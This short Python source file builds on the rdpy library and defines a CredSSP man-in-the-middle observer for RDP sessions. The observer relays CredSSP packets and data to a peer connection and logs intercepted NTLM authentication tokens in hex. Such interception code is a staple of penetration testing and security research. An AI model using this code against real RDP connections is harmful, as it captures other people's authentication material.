from rdpy.core import log
from rdpy.layer.cssp import CredSSPObserver


class CredSSPMITMObserver(CredSSPObserver):
    def __init__(self, peer):
        CredSSPObserver.__init__(self)
        self.peer = peer

    def onPDUReceived(self, pdu):
        self.peer.sendCredSSPPDU(pdu)

    def onDataReceived(self, data):
        self.peer.sendCredSSPData(data)

    def onNTLMToken(self, tokens):
        for token in tokens:
            log.info("NTLM Token: %s" % token.encode("hex"))